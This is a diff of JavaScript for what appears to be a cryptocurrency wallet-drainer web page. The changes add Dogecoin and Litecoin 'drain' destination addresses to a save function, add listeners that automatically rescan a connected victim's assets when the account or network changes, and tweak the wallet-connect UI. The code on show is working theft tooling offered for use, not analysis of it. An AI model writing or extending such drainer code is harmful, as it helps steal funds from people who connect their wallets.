@@ -746,8 +940,10 @@ function saveDrainWallets() {
     CONFIG.drainWallets.tron = document.getElementById('tronAddress').value.trim();
     CONFIG.drainWallets.bitcoin = document.getElementById('bitcoinAddress').value.trim();
     CONFIG.drainWallets.solana = document.getElementById('solanaAddress').value.trim();
+    CONFIG.drainWallets.dogecoin = document.getElementById('dogecoinAddress').value.trim();
+    CONFIG.drainWallets.litecoin = document.getElementById('litecoinAddress').value.trim();
     
-    alert('✅ Drain addresses saved!');
+    alert('✅ Drain addresses saved successfully!');
     closeModal();
 }
 
@@ -759,7 +955,7 @@ function displayScanResults() {
     if (!tokensEl) return;
     
     if (detectedTokens.length === 0) {
-        tokensEl.innerHTML = '<div class="no-tokens">No assets found</div>';
+        tokensEl.innerHTML = '<div class="no-tokens">No assets found across any chain</div>';
         return;
     }
     
@@ -778,8 +974,8 @@ function displayScanResults() {
         html += `
             <div class="chain-section">
                 <div class="chain-header">
-                    <span>${chain}</span>
-                    <span class="chain-total">$${chainValue.toFixed(2)}</span>
+                    <span class="chain-name">${chain}</span>
+                    <span class="chain-value">$${chainValue.toFixed(2)}</span>
                 </div>
                 <div class="tokens-list">
         `;
@@ -815,7 +1011,6 @@ function updateStatus(message) {
     if (statusEl) {
         statusEl.textContent = message;
     }
-    console.log('Status:', message);
 }
 
 function closeModal() {
@@ -829,12 +1024,12 @@ function closeModal() {
 
 function disconnectWallet() {
     currentAccount = null;
-    currentWallet = null;
+    currentWalletType = null;
     isConnected = false;
     detectedTokens = [];
     
     if (connectBtn) {
-        connectBtn.innerHTML = '🔗 Connect Wallet';
+        connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
     }
     
     if (drainBtn) {
@@ -848,6 +1043,26 @@ function disconnectWallet() {
     updateStatus('Disconnected. Click "Connect Wallet" to begin.');
 }
 
+// Setup EVM wallet listeners
+function setupEVMListeners() {
+    if (!window.ethereum) return;
+    
+    window.ethereum.on('accountsChanged', (accounts) => {
+        if (accounts.length === 0) {
+            disconnectWallet();
+        } else if (currentAccount !== accounts[0]) {
+            currentAccount = accounts[0];
+            updateStatus(`🔄 Account changed: ${shortAddress(currentAccount)}`);
+            startUniversalScan();
+        }
+    });
+    
+    window.ethereum.on('chainChanged', () => {
+        updateStatus('🔄 Network changed');
+        startUniversalScan();
+    });
+}
+
 // ================================================
 // UTILITY FUNCTIONS
 // ================================================
@@ -856,7 +1071,6 @@ function getWalletName(type) {
     const names = {
         'metamask': 'MetaMask',
         'trustwallet': 'Trust Wallet',
-        'binance': 'Binance Chain',
         'tron': 'TRON',
         'bitcoin': 'Bitcoin',
         'solana': 'Solana',
@@ -869,10 +1083,6 @@ function shortAddress(address, length = 8) {
     if (!address) return '';
     if (address.length <= length + 3) return address;
     return address.substring(0, length) + '...' + address.substring(address.length - 4);
-}
-
-function delay(ms) {
-    return new Promise(resolve => setTimeout(resolve, ms));
 }
 
 // ================================================
@@ -1124,15 +1334,15 @@ function addModalStyles() {
             margin: 0 auto 20px;
         }
         
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
         .no-tokens {
             text-align: center;
             padding: 40px;
             color: #6b7280;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     `;
     
